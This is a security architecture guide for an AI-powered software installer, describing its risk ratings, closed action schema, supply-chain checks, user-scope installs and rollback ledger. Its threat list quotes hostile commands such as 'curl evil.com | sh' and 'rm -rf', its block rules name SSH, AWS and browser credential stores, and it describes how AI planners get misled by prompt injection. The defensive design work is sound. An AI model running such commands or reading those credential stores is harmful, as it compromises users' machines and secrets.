# SetupPal Security Architecture & Safety Guide

## Overview

SetupPal is an AI-powered assistant designed to help non-technical users install and configure software safely. Because an AI planner can be misled by search engine poisoning, hallucinated package names, or malicious copycat projects, SetupPal does not give the AI unrestricted access to the computer. Instead, it places a deterministic, multi-layer safety system between the AI and the operating system. This architecture is designed to contain blast radius and significantly reduce risk: actions are strictly typed, inspected against security databases, executed with the lowest necessary permissions, verified after completion, and recorded in an undoable ledger.

---

## How a Typical Install Works

Installing software with SetupPal follows a predictable six-step workflow designed to keep the user informed without overwhelming them:

1. **User States a Goal:** The user enters a request in plain English (such as *"set up Python"* or *"install Minecraft mods"*).
2. **SetupPal Builds a Plan Card:** The AI suggests an execution plan, but does not run it. The app displays a concise Plan Card listing every step, the source where files will be fetched from, and the risk rating.
3. **One-Click Approval:** If every step is verified safe (Green), the user approves the entire plan with a single click. There are no repetitive prompts for each individual file or sub-step.
4. **Narrated Execution:** During execution, SetupPal switches to an active progress view. The pet assistant narrates each action as it occurs (downloading, checking hashes, installing) while maintaining a real-time activity feed.
5. **Post-Install Verification:** SetupPal tests that the installed tool actually works in a clean, fresh process (such as running `python --version`). It reports the true outcome to the user rather than assuming success.
6. **One-Click Undo Available:** Every completed task displays an **Undo** button. If the software is unwanted, broken, or installed by mistake, one click reverts the changes, cleans up the files, and restores the environment.

---

## Security vs. Ease of Use

Security tools often fail non-technical users by showing endless technical alerts that train people to click "Allow" without reading. SetupPal follows specific interaction rules to maintain security while avoiding prompt fatigue:

- **Ask by risk, not by step:**
  - **Green:** Safe, verified actions proceed without interrupting the user. All activity is logged in the feed.
  - **Yellow:** Unverified, unusual, or higher-risk actions pause and ask for confirmation once, accompanied by a clear, plain-language reason.
  - **Red:** Dangerous actions are blocked immediately. SetupPal never shows a "Run Anyway" button for Red actions; instead, it explains the threat and points to a safe alternative if one exists.
- **Approve the plan once:** Rather than asking permission for every file download, folder creation, and environment variable update, SetupPal summarizes all steps in one plan card. One click approves the entire sequence if all steps are Green. Only a Yellow step pauses the sequence, and only for that specific step.
- **Narrow trust accumulation:** Users can optionally check a *"Don't ask me about this kind of thing again"* box, but this trust is strictly scoped to a specific category (such as *"verified winget packages"*). It never applies globally. Any step flagged Yellow or Red will always interrupt and prompt the user regardless of saved preferences.
- **Undo is the primary safety net:** Because every action is tracked and reversible, the app can safely reduce upfront friction. Users can proceed confidently knowing that unwanted changes can be rolled back cleanly.

---

## The Traffic-Light System

SetupPal assigns every action a deterministic risk rating based on multi-signal scoring (from 0 to 100):

| Rating | Score Range | What It Means | What the User Sees | User Action Required |
| :--- | :--- | :--- | :--- | :--- |
| **Green** | 0 – 29 | Verified official source, trusted publisher, clean vulnerability record, valid file checksum. | A green badge with verified source links (e.g., `Getting this from python.org`). | None. Auto-approved within the overall plan. |
| **Yellow** | 30 – 69 | Unverified website, newly published package, low download count, missing checksum, or admin requirement. | A yellow warning card explaining the reason in plain English with the source domain. | One-time approval required to proceed with this step. |
| **Red** | 70 – 100 | Known vulnerability (CVE), typosquatting / copycat package, search-spoofed domain, or prohibited command. | A red block card explaining the risk, with the official safe alternative highlighted. | Hard block. No override button is provided. |

---

## Source Transparency

Every download or install action shown in the UI must clearly state its origin:

- **Plain-language label with clickable link:** The UI displays a label alongside the live destination, such as `Getting this from python.org` linking directly to `https://www.python.org`.
- **Actual domain guarantee:** The displayed domain must always be the real network host where the file originates. SetupPal never substitutes friendly display names that could mask the underlying URL.
- **Untrusted domain flagging:** If a download source does not match the hardcoded official allowlist or verified consensus, SetupPal displays the raw domain and automatically flags the step as Yellow or Red. Showing the real domain provides an intentional, visible layer of defense where deceptive or misspelled domains stand out to users and reviewers.

---

## Plain-Language UI Translations

Security warnings must be understandable to anyone. SetupPal translates technical findings into plain English across all UI views:

| Technical Finding / Signal | Plain-English UI Translation | User-Facing Explanation |
| :--- | :--- | :--- |
| SHA-256 digest match | Verified source | "File fingerprint matches the official release." |
| Typosquat match (edit distance 1–2) | Lookalike warning | "This looks like an unofficial copy of the popular package `<name>`." |
| Active OSV CVE vulnerability | Known security flaw | "This version has an unresolved security issue. SetupPal recommends version `<version>` instead." |
| Domain in verified allowlist | Official source | "Downloaded directly from the official developer website." |
| Domain not in allowlist / unverified | Unverified website | "This download comes from a website SetupPal could not independently verify." |
| Package age < 30 days | Newly published software | "This package was released recently (less than 30 days ago)." |
| Download count < 1,000 | Low community adoption | "Very few people have downloaded this package so far." |
| Verification API timeout / offline | Verification unavailable | "Couldn't reach our safety checks right now. Proceed with caution?" |
| Missing upstream checksum | Unchecked file integrity | "The publisher did not provide a checksum to verify file integrity." |
| Requires UAC / Administrator | Administrator access needed | "This tool requires administrator approval to install system-level components." |

---

## The Protection Layers

SetupPal implements five distinct protection layers between the AI's suggestions and the operating system.

### Layer 1: Closed Action Schema
- **Threat addressed:** AI hallucinations, prompt injection, and dangerous shell execution (such as `curl evil.com | sh`, `rm -rf`, or drive formatting).
- **How it works:** The AI cannot execute arbitrary command-line strings. It can only propose structured actions from a fixed Rust enum (`Step`): `InstallPackage`, `DownloadArtifact`, `VerifyHash`, `AddToUserPath`, `CreateIsolatedEnv`, and `RunVerifyCommand`. The schema physically lacks commands for deleting user files or formatting disks. Arguments are checked to ensure they do not contain shell chaining characters (`;`, `|`, `&`, `>`, `<`, `$`, or backticks) and are run directly as process arguments without invoking `cmd.exe` or `powershell.exe`.
- **Limitations:** Does not inspect the internal logic of compiled binaries executed by an allowed package manager or verification binary.

### Layer 2: Deterministic Safety Radar
- **Threat addressed:** Malicious supply-chain packages, copycats, known published vulnerabilities, and search engine optimization (SEO) poisoning where fake websites mimic authentic projects.
- **How it works:** Evaluates every step deterministically across multiple checks:
  1. *Hard Policy:* Blocks prohibited commands, shell metacharacters, and sensitive path access (e.g., `.ssh`, `.aws`, browser credential stores).
  2. *Typosquatting Radar:* Uses Levenshtein distance calculations to detect package names that closely mimic popular packages (e.g., `reqwests` instead of `requests`).
  3. *Vulnerability Database:* Queries the OSV.dev database in real time for known vulnerabilities and security advisories.
  4. *Web Search Consensus (Tavily):* Cross-references download URLs against developer repositories and web consensus to detect lookalike malware domains.
  5. *Registry Metadata:* Inspects package release age, download counts, and setup scripts for obfuscation.
- **Limitations:** Brand new ("zero-day") malware with no existing CVEs or reports, and packages that do not exhibit obvious typosquatting or naming anomalies, will not be caught by static heuristics.

### Layer 3: User-Scope Execution
- **Threat addressed:** System-wide compromise, operating system corruption, persistent rootkits, and disabling of security tools like Windows Defender.
- **How it works:** SetupPal runs software installations inside user space:
  - Package managers are invoked with user-scope flags (e.g., `winget install --scope user`).
  - Python dependencies are installed into dedicated virtual environments (`.venv/`) isolated to the project.
  - Node packages are installed locally.
  - User-scope processes do not hold permissions to modify `C:\Windows\System32` or global `Program Files` directories.
- **Limitations:** User-scope processes still have access to the user's personal files, desktop, documents, and network connections. They can read or delete files owned by that user if the software is malicious.

### Layer 4: Hash & Checksum Verification
- **Threat addressed:** Man-in-the-middle tampering, incomplete downloads, and corrupted release files.
- **How it works:** Downloaded artifacts must match the official cryptographic hash (SHA-256) provided by the package manifest or release metadata before execution or extraction occurs. If the calculated digest does not match, execution halts immediately with a Red rating.
- **Limitations:** Relies on the upstream repository or manifest providing an authentic checksum. If the upstream repository account itself is compromised and the attacker updates both the file and the checksum, hash verification alone cannot detect the breach.

### Layer 5: Transaction Ledger & 1-Click Undo
- **Threat addressed:** Incomplete setups, orphaned files, polluted environment variables, and user remorse.
- **How it works:** Every completed step is recorded in an append-only JSON Lines ledger (`.orchestrator_state.jsonl`). Each entry contains the exact inverse rollback action:
  - Package installations store the silent uninstaller command.
  - Path modifications store the previous `PATH` value for exact restoration.
  - Downloads and isolated environments store their explicit directory and file boundaries.
  Clicking **Undo** executes these rollback actions in reverse order to return the system to its prior state.
- **Limitations:** Rollback can only remove files, directories, packages, and environment settings that SetupPal managed. If an installed application created independent files outside its designated directory during runtime, the basic uninstaller might leave those files behind.

---

## Handling Admin-Required Installs

Certain software—such as hardware drivers, low-level system runtimes, and games with kernel anti-cheat—requires Windows Administrator (UAC elevated) rights to install. SetupPal handles these through a dedicated, isolated flow:

1. **Never bundled in Green plans:** Admin-level tasks are never marked Green and cannot be silently auto-approved.
2. **Always Yellow:** Steps requiring elevation are classified as Yellow by default, requiring clear, separate user confirmation.
3. **Explicit rationale:** The UI explains why administrator rights are needed (e.g., *"This driver requires administrator access to register system hardware components"*).
4. **Standard Windows UAC prompt:** SetupPal does not bypass or automate Windows User Account Control; the user will still see the standard Windows system prompt before elevated execution can proceed.

---

## Failure Modes and Defaults

When network services or verification checks experience disruptions, SetupPal follows strict fail-safe rules:

- **Verification service outage or timeout:** If external APIs (such as OSV.dev or Tavily search) are unreachable or time out, SetupPal **fails closed to Yellow**. It will never silently mark an unverified package as Green, nor will it hard-block everything as Red. The user sees: *"SetupPal couldn't reach the verification service to verify this package. Would you like to review and proceed?"*
- **Ambiguous packages:** If a requested package name matches multiple candidates or registries with conflicting information, SetupPal defaults to Yellow and prompts the user to select the authentic publisher.
- **Checksum mismatches:** If a downloaded file does not match its expected SHA-256 hash, execution immediately terminates with a **Red** rating. The corrupt or modified file is not executed.
- **Post-install verification failure:** If an installed binary cannot be invoked or fails its version/sanity test (e.g., `python --version` returns an error), SetupPal marks the task as failed, notifies the user honestly, and presents the option to Undo the installation.

---

## What SetupPal Does NOT Protect Against

To maintain realistic expectations, users and security evaluators should understand the operational boundaries of SetupPal:

1. **Malicious code running with user permissions:** SetupPal confines installations to user scope to prevent operating system corruption. However, any code running in user scope has the same rights as the logged-in user: it can access files in the user's home directory, read documents, access local network shares, and transmit data over the Internet.
2. **Unreported and Zero-Day threats:** No security system can detect every threat. If a new malicious package is published with clean metadata, no reported CVEs, and no detected typosquatting, SetupPal's safety radar will not flag it.
3. **Compromised publisher accounts:** If a legitimate developer's account on PyPI, npm, or GitHub is hijacked and a malicious update is signed and released through official channels, hash checks and domain allowlists will treat it as valid until the community reports the incident.
4. **Application-level software bugs:** SetupPal verifies the integrity and provenance of software packages, but cannot guarantee that third-party software is bug-free, stable, or compatible with other tools on the machine.
5. **Intentional override of warnings:** If a user chooses to approve a Yellow-rated step containing unverified software, SetupPal will execute it as requested.

---

## Technical Appendix

This section provides technical details for developers, security researchers, and system auditors.

### 1. Risk Scoring Engine & Thresholds

Risk scores are normalized integers from `0` to `100`. The overall plan rating equals the maximum risk rating among all its constituent steps (`Green < Yellow < Red`).

```
Risk Scores:
  0 ------------ 29 | 30 ------------------------ 69 | 70 ---------------- 100
       GREEN        |              YELLOW             |            RED
  (Auto-approvable) |     (Explicit consent needed)   |      (Hard blocked)
```

| Signal / Evaluation Condition | Assigned Score | Resulting Rating | Implementation Module |
| :--- | :--- | :--- | :--- |
| Hard policy violation (shell metacharacters, prohibited commands, credential store access) | `100` | **Red** | `crates/core/src/safety/policy.rs` |
| SHA-256 verification mismatch | `100` | **Red** | `crates/core/src/safety/hash.rs` |
| Tavily search consensus confirms spoofed / lookalike domain | `100` | **Red** | `crates/core/src/safety/tavily.rs` |
| Typosquatting detected (Levenshtein distance $1 \le d \le 2$ from top package) | `95` | **Red** | `crates/core/src/safety/typosquat.rs` |
| Download URL domain not in allowlist and unverified by search consensus | `95` | **Red** | `crates/core/src/safety/policy.rs` |
| Active OSV.dev CVE record found | `90` | **Red** | `crates/core/src/safety/osv.rs` |
| Critical install script flag (base64 payloads, direct socket/network calls) | `90` | **Red** | `crates/core/src/safety/policy.rs` |
| Non-critical install script warning | `55` | **Yellow** | `crates/core/src/safety/policy.rs` |
| Upstream registry metadata verification failure / network error | `50` | **Yellow** | `crates/core/src/safety/mod.rs` |
| Young package warning (published $< 30$ days ago) | `45` | **Yellow** | `crates/core/src/safety/mod.rs` |
| Low adoption warning ($< 1,000$ recorded downloads) | `45` | **Yellow** | `crates/core/src/safety/mod.rs` |
| Missing upstream SHA-256 digest | `40` | **Yellow** | `crates/core/src/safety/mod.rs` |
| All checks passed cleanly | `0` | **Green** | `crates/core/src/safety/mod.rs` |

### 2. External Data Sources & APIs

- **OSV.dev REST API (`https://api.osv.dev/v1/query`):** Queries open-source vulnerability databases across PyPI, npm, crates.io, Go, and Maven ecosystems.
- **Tavily AI Search API (`https://api.tavily.com/search`):** Performs web consensus searches (`"official website and github repository for <tool>"`) to determine authentic distribution domains and identify lookalike domains.
- **Package Registry Metadata APIs:**
  - `winget` local manifest and source catalogs
  - PyPI JSON API (`https://pypi.org/pypi/<package>/json`)
  - npm registry API (`https://registry.npmjs.org/<package>`)
  - Modrinth API v2 (`https://api.modrinth.com/v2`)
  - GitHub Releases REST API

### 3. Core Codebase Modules

The security architecture is implemented across the `crates/core` crate:

```
crates/core/src/
├── types.rs           # Closed Action Schema (Step enum, AllowedBinary, Plan, Ecosystem)
├── safety/
│   ├── mod.rs         # SafetyEngine: orchestrator for all safety evaluations and scoring
│   ├── policy.rs      # Allowlist domains, shell metacharacter filters, destructive pattern matchers
│   ├── typosquat.rs   # Levenshtein distance matching against popular package corpuses
│   ├── osv.rs         # OSV.dev client and CVE vulnerability models
│   ├── tavily.rs      # Web consensus engine detecting SEO poisoning and lookalikes
│   └── hash.rs        # Streaming SHA-256 calculation and verification
├── state/
│   └── mod.rs         # Append-only ledger (.orchestrator_state.jsonl) and rollback engine
├── verifier/
│   └── mod.rs         # Fresh-process environment and binary version verification
└── executor/
    └── mod.rs         # Step executor enforcing user-scope flags and argument safety
```

### 4. Append-Only Transaction Ledger Format

All state modifications are appended to `.orchestrator_state.jsonl` as structured JSON objects:

```json
{
  "tx_id": "tx-8f3a1b02-5c74-4b2e",
  "timestamp": "2026-10-26T18:30:00Z",
  "plan_id": "plan-python-312",
  "goal": "set up Python",
  "step_id": "step-1",
  "action_summary": "Installed Python 3.12 via winget (user scope)",
  "step": {
    "action": "install_package",
    "params": {
      "ecosystem": "winget",
      "package_id": "Python.Python.3.12",
      "version": "3.12.2",
      "source_adapter": "winget"
    }
  },
  "dry_run": false,
  "changes_made": [
    "Installed package Python.Python.3.12 into user profile",
    "Registered user environment PATH entry"
  ],
  "rollback_hint": "winget uninstall Python.Python.3.12 --silent",
  "rollback_data": {
    "type": "package_install",
    "data": {
      "ecosystem": "winget",
      "package_id": "Python.Python.3.12",
      "uninstall_command": "winget uninstall Python.Python.3.12 --silent"
    }
  }
}
```

### 5. Deterministic Rollback Mappings

| Action Type | Ledger Data Type (`RollbackData`) | Rollback Mechanism Executed on Undo |
| :--- | :--- | :--- |
| `InstallPackage` | `PackageInstall` | Spawns registered silent uninstaller (e.g., `winget uninstall <ID> --silent` or `pip uninstall -y <ID>`). |
| `DownloadArtifact` | `FileDownload` | Deletes the downloaded artifact file directly from the filesystem (`std::fs::remove_file`). |
| `CreateIsolatedEnv` | `IsolatedEnv` | Recursively removes the isolated directory (`std::fs::remove_dir_all`), such as `.venv/`. |
| `AddToUserPath` | `PathBackup` | Replaces the current `HKCU\Environment\Path` registry key with the preserved snapshot. |
| `RunVerifyCommand` | *None* | Read-only check; records no rollback action. |
| `VerifyHash` | *None* | Read-only check; records no rollback action. |
